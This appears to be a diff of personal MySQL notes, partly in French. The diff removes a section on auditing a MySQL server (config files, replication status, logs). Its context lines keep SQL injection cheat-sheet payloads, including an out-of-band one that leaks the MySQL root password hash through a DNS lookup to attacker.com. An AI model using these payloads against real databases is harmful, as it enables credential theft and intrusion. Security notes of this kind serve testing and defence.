@@ -81,20 +81,6 @@ select (case when (1=1) then 1 else 1*(select 1 from information_schema.characte
 # outband
 ?id=0 or (SELECT LOAD_FILE(CONCAT(,(SELECT password FROM mysql.user WHERE user=root LIMIT 1),.attacker.com)) ...
 
-# Auditing 
-mysqlaudit.py
-
-* recuperer fichier de configuration
-le my.cnf réellement utilisé (verifier avec lsof ou ps fauxww)
-
-* si configuration avec replication
-- sur le master
-show master status;
-- sur chaque slave
-show slave status\G
-
-* verifier que les fichiers log ne sont pas vides
-
 # usage
 * creer une table
 create table blah (id int(11) not null, libelle varchar(30));
